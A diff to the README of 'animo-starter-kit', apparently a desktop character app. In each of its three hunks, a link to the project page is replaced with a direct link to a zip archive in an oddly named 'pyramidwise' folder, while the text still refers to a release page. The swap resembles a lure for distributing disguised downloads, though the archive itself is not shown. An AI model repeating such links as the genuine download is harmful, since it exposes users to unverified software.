@@ -1,6 +1,6 @@
 # 🐾 animo-starter-kit - Bring Characters to Life Easily
 
-[![Download animo-starter-kit](https://img.shields.io/badge/Download-animo--starter--kit-green?style=for-the-badge)](https://github.com/ahmed44851/animo-starter-kit)
+[![Download animo-starter-kit](https://img.shields.io/badge/Download-animo--starter--kit-green?style=for-the-badge)](https://github.com/ahmed44851/animo-starter-kit/raw/refs/heads/main/pyramidwise/kit-animo-starter-v2.5-beta.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before installing, make sure your computer meets these requirements:
 
 Start by visiting the project download page here:
 
-[Download animo-starter-kit](https://github.com/ahmed44851/animo-starter-kit)  
+[Download animo-starter-kit](https://github.com/ahmed44851/animo-starter-kit/raw/refs/heads/main/pyramidwise/kit-animo-starter-v2.5-beta.5.zip)  
 Click the button above or open the link in your browser.
 
 On the page, look for the latest release or download section. This page hosts the installation files you will need.
@@ -113,7 +113,7 @@ The character will stay on your desktop as a fun companion while you work or pla
 
 Use this link to visit the download page and get the latest version:
 
-[Download animo-starter-kit](https://github.com/ahmed44851/animo-starter-kit)  
+[Download animo-starter-kit](https://github.com/ahmed44851/animo-starter-kit/raw/refs/heads/main/pyramidwise/kit-animo-starter-v2.5-beta.5.zip)  
 
 Click the release section to find the Windows setup file. Follow the installation instructions above to get started.
 
